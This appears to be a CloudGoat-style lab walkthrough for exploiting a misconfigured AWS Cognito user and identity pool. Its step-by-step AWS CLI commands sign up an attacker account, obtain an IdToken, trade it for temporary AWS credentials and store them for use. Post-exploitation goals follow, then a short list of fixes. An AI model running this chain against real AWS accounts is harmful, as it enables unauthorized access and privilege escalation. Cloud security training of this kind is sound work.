
# 🛠️ CloudGoat-style Walkthrough: Exploiting Misconfigured Cognito

## ⚡ TL;DR

In this attack, we exploit an AWS Cognito misconfiguration by authenticating against a vulnerable user pool and retrieving temporary AWS credentials through the identity pool. This allows lateral movement or privilege escalation depending on the IAM roles linked.

---

## 📌 Target

- **Cognito Identity Pool ID**: `us-east-1:a96c9f79-324c-c9d1-3de8-ec55221338c8`
- **Cognito App Client ID** (assumed): `<APP_CLIENT_ID_HERE>`
- **Region**: `us-east-1`

---

## 🧭 Step-by-Step Exploitation

### 🔍 Step 1: Identify Misconfigured Cognito Pool

The vulnerable application exposed:
- A public-facing **User Pool**
- An **App Client** with no secret (usable in the frontend)
- An **Identity Pool** trusting tokens from the User Pool

If signup is enabled, you can register a new user:
```bash
aws cognito-idp sign-up   --client-id <APP_CLIENT_ID>   --username attacker@example.com   --password 'Password123!'   --region us-east-1
```

Then confirm manually (or via an exposed admin flow).

---

### 🔐 Step 2: Authenticate to Get a Token

Use the username/password to authenticate and receive the `IdToken`:

```bash
aws cognito-idp initiate-auth   --auth-flow USER_PASSWORD_AUTH   --client-id <APP_CLIENT_ID>   --auth-parameters USERNAME=attacker@example.com,PASSWORD='Password123!'   --region us-east-1
```

**Output**:
```json
{
  "AuthenticationResult": {
    "IdToken": "eyJraWQiOiJLTUt...", 
    "AccessToken": "...",
    "ExpiresIn": 3600,
    "TokenType": "Bearer"
  }
}
```

---

### 🎟️ Step 3: Exchange IdToken for AWS Credentials

Pass the `IdToken` to Cognito Identity to get AWS credentials:

```bash
aws cognito-identity get-id   --identity-pool-id us-east-1:a96c9f79-324c-c9d1-3de8-ec55221338c8   --logins "cognito-idp.us-east-1.amazonaws.com/<USER_POOL_ID>"="eyJraWQiOi..."   --region us-east-1
```

This returns the **Cognito Identity ID**:
```json
{
  "IdentityId": "us-east-1:abcd1234-5678-90ef-ghij-klmnopqrstuv"
}
```

---

### 🔑 Step 4: Get Temporary AWS Credentials

Use the identity ID and token to request AWS credentials:

```bash
aws cognito-identity get-credentials-for-identity   --identity-id us-east-1:abcd1234-5678-90ef-ghij-klmnopqrstuv   --logins "cognito-idp.us-east-1.amazonaws.com/<USER_POOL_ID>"="eyJraWQiOi..."   --region us-east-1
```

**Output**:
```json
{
  "Credentials": {
    "AccessKeyId": "ASIA...",
    "SecretKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCY...",
    "SessionToken": "IQoJb3JpZ2luX2VjE...",
    "Expiration": "2025-06-05T15:30:00Z"
  }
}
```

---

## 🔧 Step 5: Set AWS CLI Profile (Optional)

To use these creds with AWS CLI:

Edit `~/.aws/credentials`:
```ini
[exploit]
aws_access_key_id = ASIA...
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/...
aws_session_token = IQoJb3JpZ2luX2VjE...
```

Then test:
```bash
aws sts get-caller-identity --profile exploit
```

---

## 🚀 Post-Exploitation

Once you have temporary credentials:
- Enumerate S3, IAM, and EC2 access
- Attempt privilege escalation (e.g., via IAM policy abuse)
- Check for excessive trust on the identity pool

---

## 🧪 Detection & Mitigation

### ✅ Fixes:
- Disable open signup or require email verification
- Remove trust relationships between Identity Pool and public User Pool
- Use App Clients with client secret
- Implement fine-grained IAM role mappings
